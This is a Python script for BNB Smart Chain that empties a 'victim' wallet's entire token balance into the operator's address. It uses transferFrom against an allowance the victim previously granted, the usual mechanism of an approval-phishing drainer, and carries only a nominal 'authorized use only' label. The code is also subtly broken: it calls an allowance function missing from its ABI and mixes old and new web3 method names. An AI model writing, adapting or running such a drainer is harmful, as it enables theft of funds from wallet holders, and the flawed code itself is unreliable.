from web3 import Web3
import argparse
import getpass

def main():
    # Setup argument parser
    parser = argparse.ArgumentParser(description='Token transfer tool (for authorized use only)')
    parser.add_argument('--rpc', default="https://bsc-dataseed.binance.org/", help='BSC RPC endpoint')
    parser.add_argument('--token', required=True, help='Token contract address')
    parser.add_argument('--victim', required=True, help='Source wallet address')
    parser.add_argument('--receiver', required=True, help='Destination wallet address')
    args = parser.parse_args()

    # Validate addresses
    if not Web3.is_address(args.token):
        print("Error: Invalid token contract address")
        return
    if not Web3.is_address(args.victim):
        print("Error: Invalid source wallet address")
        return
    if not Web3.is_address(args.receiver):
        print("Error: Invalid receiver wallet address")
        return

    # Normalize addresses
    args.token = Web3.to_checksum_address(args.token)
    args.victim = Web3.to_checksum_address(args.victim)
    args.receiver = Web3.to_checksum_address(args.receiver)

    # Securely get private key
    private_key = getpass.getpass("Enter your private key (hidden input): ")

    try:
        # Initialize Web3
        w3 = Web3(Web3.HTTPProvider(args.rpc))
        
        # Verify connection
        if not w3.isConnected():
            print("Failed to connect to blockchain")
            return

        # Verify private key matches receiver address
        account = w3.eth.account.from_key(private_key)
        if account.address.lower() != args.receiver.lower():
            print("Error: Private key doesn't match receiver address")
            return

        # Contract ABI
        token_abi = [
            {
                "inputs": [{"name": "account", "type": "address"}],
                "name": "balanceOf",
                "outputs": [{"name": "", "type": "uint256"}],
                "stateMutability": "view",
                "type": "function"
            },
            {
                "inputs": [
                    {"name": "from", "type": "address"},
                    {"name": "to", "type": "address"},
                    {"name": "amount", "type": "uint256"}
                ],
                "name": "transferFrom",
                "outputs": [{"name": "", "type": "bool"}],
                "stateMutability": "nonpayable",
                "type": "function"
            }
        ]

        token = w3.eth.contract(address=args.token, abi=token_abi)

        # Check balances
        victim_balance = token.functions.balanceOf(args.victim).call()
        bnb_balance = w3.eth.get_balance(account.address)
        gas_price = w3.eth.gas_price
        gas_needed = 200000 * gas_price

        print(f"\n[+] Token Contract: {args.token}")
        print(f"[+] Source Address: {args.victim}")
        print(f"[+] Receiver Address: {args.receiver}")
        print(f"[+] Victim Token Balance: {victim_balance / 10**18}")
        print(f"[+] Your BNB Balance: {w3.from_wei(bnb_balance, 'ether')}")
        print(f"[+] Current Gas Price: {w3.from_wei(gas_price, 'gwei')} gwei")
        print(f"[+] Estimated Gas Cost: {w3.from_wei(gas_needed, 'ether')} BNB")

        if bnb_balance < gas_needed:
            print("\nError: Insufficient BNB for gas")
            return

        if victim_balance == 0:
            print("\nError: Source wallet has no token balance")
            return

        # Check allowance
        allowance = token.functions.allowance(args.victim, account.address).call()
        if allowance < victim_balance:
            print(f"\nError: Insufficient allowance. Only {allowance / 10**18} tokens approved")
            return

        # Build transaction
        tx = token.functions.transferFrom(
            args.victim,
            args.receiver,
            victim_balance
        ).build_transaction({
            'from': account.address,
            'gas': 200000,
            'gasPrice': gas_price,
            'nonce': w3.eth.get_transaction_count(account.address)
        })

        # Confirm before sending
        print(f"\n[!] WARNING: About to transfer {victim_balance / 10**18} tokens")
        confirm = input("Confirm transfer (type 'YES' to confirm)? ").strip()
        if confirm != 'YES':
            print("Transfer cancelled")
            return

        # Send transaction
        signed = account.sign_transaction(tx)
        tx_hash = w3.eth.send_raw_transaction(signed.rawTransaction)
        receipt = w3.eth.wait_for_transaction_receipt(tx_hash)
        
        if receipt.status == 1:
            print(f"\n[+] Success! TX Hash: {tx_hash.hex()}")
            print(f"Block: {receipt.blockNumber}")
            print(f"Gas Used: {receipt.gasUsed}")
        else:
            print("\nError: Transaction failed")

    except Exception as e:
        print(f"\nError: {str(e)}")

if __name__ == "__main__":
    main()
